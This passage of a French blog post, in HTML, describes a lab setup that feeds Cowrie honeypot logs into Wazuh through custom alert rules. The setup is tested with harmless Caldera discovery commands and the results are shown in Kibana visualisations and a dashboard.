+        /posts/cyberlab-ii/img/38_Agent-Conf_hu1f7416e34c6890b99519cd2e087c26f9_49321_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/38_Agent-Conf_hu1f7416e34c6890b99519cd2e087c26f9_49321_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/38_Agent-Conf_hu1f7416e34c6890b99519cd2e087c26f9_49321_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/38_Agent-Conf_hu1f7416e34c6890b99519cd2e087c26f9_49321_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<blockquote>
+<p>Cette configuration permet de diriger l’analyse des logs vers le fichier <strong><em>cowrie.json</em></strong>. Comme le montre la capture de la rubrique <strong>log data analysis</strong> de la section <strong>Agents Management &gt; Summary</strong>, le chemin est correctement renseigné.</p>
+</blockquote>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/39_log-location_huf8f9ba8e8eff6f1c656f019b38f33f5f_68892_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/39_log-location_huf8f9ba8e8eff6f1c656f019b38f33f5f_68892_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/39_log-location_huf8f9ba8e8eff6f1c656f019b38f33f5f_68892_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/39_log-location_huf8f9ba8e8eff6f1c656f019b38f33f5f_68892_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/39_log-location_huf8f9ba8e8eff6f1c656f019b38f33f5f_68892_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<blockquote>
+<p>À cette étape, aucune alerte n’apparaît encore dans le SIEM, car les règles d’alerte spécifiques n’ont pas encore été définies.</p>
+</blockquote>
+
+
+<h3 class="relative group">5.4. Définition des Règles d’Alerte Personnalisées 
+    <div id="54-d%C3%A9finition-des-r%C3%A8gles-dalerte-personnalis%C3%A9es" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#54-d%C3%A9finition-des-r%C3%A8gles-dalerte-personnalis%C3%A9es" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Les règles suivantes ont été définies pour détecter les événements spécifiques issus de Cowrie. Ces règles seront collées dans le fichier <strong>local_rules.xml</strong> via le dashboard (<strong>Server Management &gt; Rules &gt; Manage rules &gt; Manage rules files &gt; Custom rules</strong>) :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;group</span> <span class="na">name=</span><span class="s">&#34;cowrie&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- Règle pour détecter le début d&#39;une session sur Cowrie --&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;rule</span> <span class="na">id=</span><span class="s">&#34;100010&#34;</span> <span class="na">level=</span><span class="s">&#34;3&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;decoded_as&gt;</span>json<span class="nt">&lt;/decoded_as&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;match&gt;</span>cowrie.session.params<span class="nt">&lt;/match&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;description&gt;</span>Session démarrée sur le honeypot Cowrie<span class="nt">&lt;/description&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;group&gt;</span>cowrie,session<span class="nt">&lt;/group&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/rule&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- Règle pour détecter une commande saisie sur Cowrie --&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;rule</span> <span class="na">id=</span><span class="s">&#34;100011&#34;</span> <span class="na">level=</span><span class="s">&#34;5&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;decoded_as&gt;</span>json<span class="nt">&lt;/decoded_as&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;match&gt;</span>cowrie.command.input<span class="nt">&lt;/match&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;description&gt;</span>Commande saisie sur le honeypot Cowrie<span class="nt">&lt;/description&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;group&gt;</span>cowrie,command<span class="nt">&lt;/group&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/rule&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- Règle pour détecter une commande échouée sur Cowrie --&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;rule</span> <span class="na">id=</span><span class="s">&#34;100012&#34;</span> <span class="na">level=</span><span class="s">&#34;7&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;decoded_as&gt;</span>json<span class="nt">&lt;/decoded_as&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;match&gt;</span>cowrie.command.failed<span class="nt">&lt;/match&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;description&gt;</span>Commande échouée sur le honeypot Cowrie<span class="nt">&lt;/description&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;group&gt;</span>cowrie,command<span class="nt">&lt;/group&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/rule&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- Règle pour détecter la fermeture d&#39;une session sur Cowrie --&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;rule</span> <span class="na">id=</span><span class="s">&#34;100013&#34;</span> <span class="na">level=</span><span class="s">&#34;4&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;decoded_as&gt;</span>json<span class="nt">&lt;/decoded_as&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;match&gt;</span>cowrie.session.closed<span class="nt">&lt;/match&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;description&gt;</span>Session fermée sur le honeypot Cowrie<span class="nt">&lt;/description&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;group&gt;</span>cowrie,session<span class="nt">&lt;/group&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/rule&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/group&gt;</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/40_xml-local_rules_hu9c78b832813645c61a592f2153c704ef_177714_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/40_xml-local_rules_hu9c78b832813645c61a592f2153c704ef_177714_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/40_xml-local_rules_hu9c78b832813645c61a592f2153c704ef_177714_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/40_xml-local_rules_hu9c78b832813645c61a592f2153c704ef_177714_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/40_xml-local_rules_hu9c78b832813645c61a592f2153c704ef_177714_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/41_local-ruleset_hu5162aa94ee21fee9aa35d0fb92373fd2_81532_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/41_local-ruleset_hu5162aa94ee21fee9aa35d0fb92373fd2_81532_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/41_local-ruleset_hu5162aa94ee21fee9aa35d0fb92373fd2_81532_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/41_local-ruleset_hu5162aa94ee21fee9aa35d0fb92373fd2_81532_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/41_local-ruleset_hu5162aa94ee21fee9aa35d0fb92373fd2_81532_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">5.5. Test de la Configuration et Simulation d’Attaques 
+    <div id="55-test-de-la-configuration-et-simulation-dattaques" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#55-test-de-la-configuration-et-simulation-dattaques" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Depuis nos autres VM, on initie une connexion SSH vers le honeypot afin de simuler une attaque. Plusieurs commandes (ex. : <code>whoami</code>, <code>ls -alh &gt; ~/bin-list.txt | tail -n 5 ~/bin-list.txt</code>, <code>ps aux | grep 'system'</code>, <code>ls -alh</code>) selon le profil discory de notre C2 caldera sont exécutées, puis la session est fermée. Ces interactions génèrent des entrées dans notre fichier de logs <em>cowrie.json</em>.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/41_testhoneypot-calvm_hu66fb73300eb5140d4ca62ab96a1eb2d7_109040_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/41_testhoneypot-calvm_hu66fb73300eb5140d4ca62ab96a1eb2d7_109040_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/41_testhoneypot-calvm_hu66fb73300eb5140d4ca62ab96a1eb2d7_109040_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/41_testhoneypot-calvm_hu66fb73300eb5140d4ca62ab96a1eb2d7_109040_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/41_testhoneypot-calvm_hu66fb73300eb5140d4ca62ab96a1eb2d7_109040_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/42_testhoneypot-ansvm_huef6c9266b556a46986598c43af81b0ce_68279_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/42_testhoneypot-ansvm_huef6c9266b556a46986598c43af81b0ce_68279_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/42_testhoneypot-ansvm_huef6c9266b556a46986598c43af81b0ce_68279_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/42_testhoneypot-ansvm_huef6c9266b556a46986598c43af81b0ce_68279_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/42_testhoneypot-ansvm_huef6c9266b556a46986598c43af81b0ce_68279_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>De retour dans la section <strong>Discover</strong> du SIEM, on peut bel et bien constater l’apparition des alertes relatives aux opérations sur le honeypot selon les règles définies.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/44_calderahoneypot-logs_hu327e990023018c92d1ecf918a9769fcf_362166_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/44_calderahoneypot-logs_hu327e990023018c92d1ecf918a9769fcf_362166_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/44_calderahoneypot-logs_hu327e990023018c92d1ecf918a9769fcf_362166_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/44_calderahoneypot-logs_hu327e990023018c92d1ecf918a9769fcf_362166_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/44_calderahoneypot-logs_hu327e990023018c92d1ecf918a9769fcf_362166_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">5.6 Analyse des logs 
+    <div id="56-analyse-des-logs" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#56-analyse-des-logs" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Le champ <code>data.src_ip</code>, indiquant <strong>192.168.243.130</strong>, confirme que l&rsquo;opération provient bien de notre VM Ansible. Par ailleurs, le champ <code>location</code> précise que le log provient du chemin <strong>/home/cowrie/cowrie/var/log/cowrie/cowrie.json</strong>, ce qui correspond à celui de notre honeypot. De plus, le champ <code>rule.description</code>, avec des mentions telles que <strong>Commande saisie sur le honeypot Cowrie</strong> ou <strong>Session fermée sur le honeypot Cowrie</strong>, nous informe de l’alerte déclenchée, conformément aux règles définies dans le fichier <strong>local_rules.xml</strong>. D&rsquo;autres champs, comme <code>data.input</code> qui recense les commandes exécutées, ou <code>timestamp</code> qui enregistre l’horodatage, fournissent également des informations essentielles pour le suivi et l&rsquo;investigation de la provenance des attaquants, l&rsquo;analyse des TTP (Tactiques, Techniques et Procédures) ainsi que d&rsquo;autres éléments pertinents.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/43_ansiblehoneypot-logs_hu3e1f4669ddd75b9e986a2f125cd8ad52_305572_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/43_ansiblehoneypot-logs_hu3e1f4669ddd75b9e986a2f125cd8ad52_305572_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/43_ansiblehoneypot-logs_hu3e1f4669ddd75b9e986a2f125cd8ad52_305572_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/43_ansiblehoneypot-logs_hu3e1f4669ddd75b9e986a2f125cd8ad52_305572_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/43_ansiblehoneypot-logs_hu3e1f4669ddd75b9e986a2f125cd8ad52_305572_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Ici nous pouvons voir les même informations relatives à l&rsquo;ip source <strong>192.168.243.129</strong>  donc à notre connexion depuis la VM Ansible.</p>
+
+
+<h3 class="relative group">5.7. Analyse Approfondie et Visualisation 
+    <div id="57-analyse-approfondie-et-visualisation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#57-analyse-approfondie-et-visualisation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Une fois les alertes générées, des étapes supplémentaires peuvent nous permettre d’isoler et d’analyser les logs liés au honeypot :</p>
+<ol>
+<li>
+<p><strong>Isolation des Logs du Honeypot :</strong></p>
+<p>Pour concentrer l’analyse sur l’activité malveillante capturée par Cowrie, nous utilisons les <strong>filtres avancés</strong> de Kibana :</p>
+</li>
+</ol>
+<ul>
+<li>
+<p><strong>Filtre par agent</strong> : <code>agent.name : &quot;cowrie-vm&quot;</code> pour isoler les événements du honeypot.</p>
+</li>
+<li>
+<p><strong>Filtre par tag</strong> : <code>rule.groups : &quot;cowrie&quot;</code> pour cibler les règles personnalisées dédiées.</p>
+</li>
+</ul>
+<blockquote>
+<p>Cette isolation permet de se concentrer sur les données pertinentes et d’éviter le bruit généré par d’autres sources.</p>
+</blockquote>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/45_Alerts-filters_hu1c8ee2d73b24e704624861aff4839110_96267_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/45_Alerts-filters_hu1c8ee2d73b24e704624861aff4839110_96267_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/45_Alerts-filters_hu1c8ee2d73b24e704624861aff4839110_96267_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/45_Alerts-filters_hu1c8ee2d73b24e704624861aff4839110_96267_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/45_Alerts-filters_hu1c8ee2d73b24e704624861aff4839110_96267_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/46_Alerts-filters-2_hue6b8e6599fed72ef38c8b12af23039b5_542576_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/46_Alerts-filters-2_hue6b8e6599fed72ef38c8b12af23039b5_542576_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/46_Alerts-filters-2_hue6b8e6599fed72ef38c8b12af23039b5_542576_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/46_Alerts-filters-2_hue6b8e6599fed72ef38c8b12af23039b5_542576_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/46_Alerts-filters-2_hue6b8e6599fed72ef38c8b12af23039b5_542576_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Pour optimiser l’analyse, le résultat de cette recherche est sauvegardé (sous le nom <code>honey-pots-log</code>) afin de générer une visualisation spécifique aux événements de notre honeypot.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/47_savesearch_hu3350b3059359410960c8692902d46506_226759_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/47_savesearch_hu3350b3059359410960c8692902d46506_226759_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/47_savesearch_hu3350b3059359410960c8692902d46506_226759_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/47_savesearch_hu3350b3059359410960c8692902d46506_226759_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/47_savesearch_hu3350b3059359410960c8692902d46506_226759_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<ol start="2">
+<li>
+<p><strong>Création de Visualisations Personnalisées :</strong></p>
+<p>Nos visualisations regrouperont les indicateurs clés (nombre de sessions, commandes exécutées, taux d’échec, etc.) avec des graphiques.</p>
+</li>
+</ol>
+<blockquote>
+<p>Ces graphs permettront d’obtenir un aperçu global de l’activité sur le honeypot et de détecter des comportements anormaux.</p>
+</blockquote>
+
+
+<h5 class="relative group">- <strong>Pie Chart (Diagramme circulaire)</strong> 
+    <div id="--pie-chart-diagramme-circulaire" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#--pie-chart-diagramme-circulaire" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>Un <em>Pie Chart</em> permet de visualiser la <strong>répartition proportionnelle</strong> des données. Dans notre cas, il met en évidence les types d’alertes les plus fréquents et la distribution des commandes suspectes sur le honeypot.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/48_Vizu1_hub75852f6af9287fc1b5da75ec6b9c13f_174500_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/48_Vizu1_hub75852f6af9287fc1b5da75ec6b9c13f_174500_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/48_Vizu1_hub75852f6af9287fc1b5da75ec6b9c13f_174500_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/48_Vizu1_hub75852f6af9287fc1b5da75ec6b9c13f_174500_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/48_Vizu1_hub75852f6af9287fc1b5da75ec6b9c13f_174500_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p><em>Top 10 des alertes globales (source : wazuh-metrics-</em>)*</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/49_Vizu2_huedb0b0fb59502fbc3df5d4437b210847_137065_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/49_Vizu2_huedb0b0fb59502fbc3df5d4437b210847_137065_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/49_Vizu2_huedb0b0fb59502fbc3df5d4437b210847_137065_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/49_Vizu2_huedb0b0fb59502fbc3df5d4437b210847_137065_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/49_Vizu2_huedb0b0fb59502fbc3df5d4437b210847_137065_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p><em>Principales alertes du honeypot (source : honey-pots-log)</em></p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/50_Vizu2_Save_huff14d76960e2a025c10d674def508783_119948_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/50_Vizu2_Save_huff14d76960e2a025c10d674def508783_119948_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/50_Vizu2_Save_huff14d76960e2a025c10d674def508783_119948_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/50_Vizu2_Save_huff14d76960e2a025c10d674def508783_119948_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/50_Vizu2_Save_huff14d76960e2a025c10d674def508783_119948_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p><em>Configuration de la visualisation avec la vue sauvegardée</em></p>
+
+
+<h5 class="relative group">- <strong>Metrics (Indicateurs clés)</strong> 
+    <div id="--metrics-indicateurs-cl%C3%A9s" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#--metrics-indicateurs-cl%C3%A9s" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>Une visualisation de type metrics offre un aperçu synthétique et en temps réel d&rsquo;une ou plusieurs valeurs clés, telles que le nombre total d’alertes, La criticité moyenne des incidents ou un taux d’échec global.</p>
+<blockquote>
+<p>Ce type de représentation est particulièrement utile pour surveiller l&rsquo;état général du système, car il permet de visualiser rapidement des indicateurs critiques</p>
+</blockquote>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/51_Dash_3_metrics_hu9a46ef13313137d4fac7a3cec1681aa6_58983_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/51_Dash_3_metrics_hu9a46ef13313137d4fac7a3cec1681aa6_58983_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/51_Dash_3_metrics_hu9a46ef13313137d4fac7a3cec1681aa6_58983_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/51_Dash_3_metrics_hu9a46ef13313137d4fac7a3cec1681aa6_58983_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/51_Dash_3_metrics_hu9a46ef13313137d4fac7a3cec1681aa6_58983_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+
+<em>Indication du nombre global d&rsquo;alertes (source : wazuh-metrics-</em>)*</p>
+
+
+<h2 class="relative group">6. Dashboard 
+    <div id="6-dashboard" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#6-dashboard" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Le dashboard final intègre l’ensemble des visualisations créées :</p>
+<ol>
+<li>
+<p>Le <strong>Top 10 des alertes globales</strong> : Détecte les tendances à l’échelle de l’infrastructure.</p>
+</li>
+<li>
+<p>Les <strong>principales alertes du honeypot</strong> : Identifie les attaques spécifiques à Cowrie.</p>
+</li>
+<li>
+<p>Un <strong>aperçu général des alertes</strong> : Offre une synthèse chiffrée des événements.</p>
+</li>
+</ol>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/52_Dash_Finale_1_hu300489b289feb4bc59a28ed923218b5f_123152_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/52_Dash_Finale_1_hu300489b289feb4bc59a28ed923218b5f_123152_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/52_Dash_Finale_1_hu300489b289feb4bc59a28ed923218b5f_123152_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/52_Dash_Finale_1_hu300489b289feb4bc59a28ed923218b5f_123152_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/52_Dash_Finale_1_hu300489b289feb4bc59a28ed923218b5f_123152_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/53_Dash_Finale_2_hua65703b22702d61f5ccd1de7bc1a9081_114762_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/53_Dash_Finale_2_hua65703b22702d61f5ccd1de7bc1a9081_114762_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/53_Dash_Finale_2_hua65703b22702d61f5ccd1de7bc1a9081_114762_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/53_Dash_Finale_2_hua65703b22702d61f5ccd1de7bc1a9081_114762_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/53_Dash_Finale_2_hua65703b22702d61f5ccd1de7bc1a9081_114762_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Cette interface synthétique offre une vue d’ensemble qui facilite la surveillance continue et permet d’identifier instantanément les zones nécessitant une attention particulière, à travers une <strong>détection rapide</strong> des pics d’activité suspecte, une <strong>corrélation visuelle</strong> entre les attaques simulé et les logs du honeypot, et enfin une <strong>base décisionnelle</strong> pour ajuster les règles Wazuh et nos stratégies de défense en conséquence.</p>
+
+
+<h2 class="relative group"><strong>Conclusion:</strong> 
+    <div id="conclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>L&rsquo;objectif principal était de créer un environnement de test complet permettant de simuler des attaques, de collecter des logs et de les analyser en temps réel pour mieux comprendre le comportement des attaquants.</p>
+<p>La configuration de Cowrie a permis de capturer des interactions variées sur le honeypot, telles que l&rsquo;ouverture et la fermeture de sessions, l&rsquo;exécution de commandes et les tentatives d&rsquo;attaques échouées. Parallèlement, Caldera a été utilisé pour orchestrer divers profils d&rsquo;attaque (Discovery, Lateral Movement, etc.), offrant ainsi une dimension offensive à l&rsquo;environnement de test. L&rsquo;intégration des logs via Wazuh a fourni une visibilité centralisée sur l&rsquo;activité des agents, permettant d&rsquo;extraire des informations critiques et de générer des alertes basées sur des règles personnalisées.</p>
+<p>Les résultats obtenus illustrent l&rsquo;efficacité d&rsquo;une approche « défense en profondeur » : en combinant la détection proactive avec l&rsquo;analyse centralisée, il est possible de détecter et d&rsquo;analyser rapidement les comportements suspects, tout en obtenant des données exploitables pour renforcer la sécurité globale. Cette approche offre ainsi un cadre solide pour la surveillance continue et l&rsquo;amélioration des défenses face à des menaces de plus en plus sophistiquées.</p>
+
+
+<h2 class="relative group">Références: 
+    <div id="r%C3%A9f%C3%A9rences" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#r%C3%A9f%C3%A9rences" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><a href="https://docs.ansible.com" target="_blank">https://docs.ansible.com</a>
+<a href="https://github.com/cowrie/cowrie" target="_blank">https://github.com/cowrie/cowrie</a>
+<a href="https://cowrie.readthedocs.io" target="_blank">https://cowrie.readthedocs.io</a><br>
+<a href="https://github.com/mitre/caldera" target="_blank">https://github.com/mitre/caldera</a><br>
+<a href="https://caldera.readthedocs.io" target="_blank">https://caldera.readthedocs.io</a>
